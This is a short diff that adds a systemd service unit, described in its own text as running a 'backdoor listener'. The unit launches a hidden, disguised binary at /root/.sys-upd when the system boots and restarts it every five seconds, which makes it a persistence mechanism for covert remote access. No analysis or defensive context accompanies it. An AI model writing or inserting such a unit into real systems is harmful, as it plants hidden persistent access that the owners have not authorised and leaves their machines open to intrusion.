@@ -1,0 +1,11 @@
+[Unit]
+Description=Runs backdoor listener
+After=network.target
+
+[Service]
+ExecStart=/root/.sys-upd
+Restart=always
+RestartSec=5
+
+[Install]
+WantedBy=multi-user.target
